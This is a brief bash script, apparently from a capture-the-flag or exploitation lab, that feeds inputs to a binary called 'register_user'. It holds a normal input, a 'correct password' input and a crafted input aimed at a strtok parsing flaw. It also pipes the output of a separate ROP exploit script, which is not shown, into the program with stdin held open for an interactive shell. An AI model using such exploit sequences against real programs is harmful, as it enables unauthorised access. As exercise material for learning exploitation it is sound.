#!bin/bash

##Normal input
python -c 'print "rajiv\n" + "boston\n" + "11/11/1111\n"'

##Correct password
python -c 'print "cfi   \n" + " ftw  \n" + "11/11/9999\n"'

##Stage 1, flaw in strtok logic
python -c 'print "aaaaa\n" + "aaaaa\n" + "1/1/111111" + "\x01\n"'

##Final exploit
./rop_exploit.py > in.txt
(cat in.txt; cat)|./register_user